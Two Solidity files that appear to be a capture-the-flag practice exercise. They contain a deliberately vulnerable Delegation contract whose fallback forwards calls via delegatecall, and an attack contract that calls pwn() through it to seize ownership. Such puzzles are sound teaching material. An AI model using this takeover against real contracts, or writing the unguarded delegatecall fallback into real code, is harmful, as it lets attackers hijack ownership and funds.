// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        bytes memory encodePwn = abi.encodeWithSignature("pwn()");
        (bool success, ) = address(contractAddress).call(encodePwn);
        if (!success) {
            revert("couldn't pwn");
        }
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate public delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    // fallback runs if you try to execute a function that doesn't exist on the Delegation contract
    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result == true) {
            this;
        }
    }
}